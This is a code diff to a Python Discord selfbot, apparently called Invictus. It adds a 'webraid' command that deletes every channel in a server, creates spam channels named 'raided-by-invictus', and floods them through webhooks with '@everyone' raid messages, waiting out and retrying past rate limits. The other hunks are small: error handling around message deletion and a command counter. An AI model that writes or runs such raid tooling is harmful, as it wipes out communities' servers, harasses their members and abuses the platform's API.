@@ -44,7 +44,10 @@ class Bot:
 
         @self.bot.event
         async def on_command(ctx):
-            await ctx.message.delete()
+            try:
+                await ctx.message.delete()
+            except:
+                pass
             self.lastcommand = ctx.message.content
 
         @self.bot.event
@@ -287,6 +290,53 @@ class Bot:
                     await ctx.send(" ".join(message))
                     message = []
                 time.sleep(delay)
+
+        @self.bot.command()
+        async def webraid(ctx, channelname="raided-by-invictus", message="@everyone RAIDED BY INVICTUS", channelamount=15, messageamount=15):
+            def webhook(hook):
+                for i in range(int(messageamount)):
+                    data = {"content" : message}
+                    r = requests.post(hook, json=data)
+                    if r.status_code == 429:
+                        self.logging.Error("Request throttled waiting {}".format(str(r.json()["retry_after"])))
+                        time.sleep(r.json()["retry_after"] + 1)
+
+            def removechannel(id):
+                headers = {"authorization": self.token}
+                api = "https://discord.com/api/v9/channels/{}".format(channel.id)
+                requests.delete(api, headers=headers)
+            def createchannel():
+                headers = {"authorization": self.token}
+                channelapi = "https://discord.com/api/v9/guilds/{}/channels".format(ctx.guild.id)
+                data = {"name": channelname, "type": 0}
+                r = requests.post(channelapi, headers=headers, json=data)
+                chanid = r.json()["id"]
+                while r.status_code != 201:
+                    r = requests.post(channelapi, headers=headers, json=data)
+                    if r.status_code == 429:
+                        self.logging.Error("Request throttled waiting {}".format(str(r.json()["retry_after"])))
+                        time.sleep(r.json()["retry_after"] + 1)
+
+                webhookapi = "https://discord.com/api/v9/channels/{}/webhooks".format(chanid)
+                data = {"name": ctx.author.name}
+                r = requests.post(webhookapi, headers=headers, json=data)
+                while r.status_code != 200:
+                    r = requests.post(webhookapi, headers=headers, json=data)
+                    if r.status_code == 429:
+                        self.logging.Error("Request throttled waiting {}".format(str(r.json()["retry_after"])))
+                        time.sleep(r.json()["retry_after"] + 1)
+
+                threading.Thread(target=webhook, args=(r.json()["url"],)).start()
+
+            for channel in ctx.guild.channels:
+                threading.Thread(target=removechannel, args=(channel.id,)).start()
+
+            for i in range(int(channelamount)):
+                createchannel()
+
+
+
+
         # Troll commands
 
         @self.bot.command()
@@ -365,6 +415,8 @@ class Bot:
                 if ctx.author.id == mesasge.author.id:
                     if mesasge.id != ctx.message.id:
                         await mesasge.delete()
+
+                        
 
 
         @self.bot.command()
@@ -454,7 +506,11 @@ class Bot:
 
             else:
                 return
-            
+        
+
+        @self.bot.command()
+        async def cmdcount(ctx):
+            await ctx.send(self.output("Command Count", str(len(self.bot.commands))))
 
         # Other
         @self.bot.command()
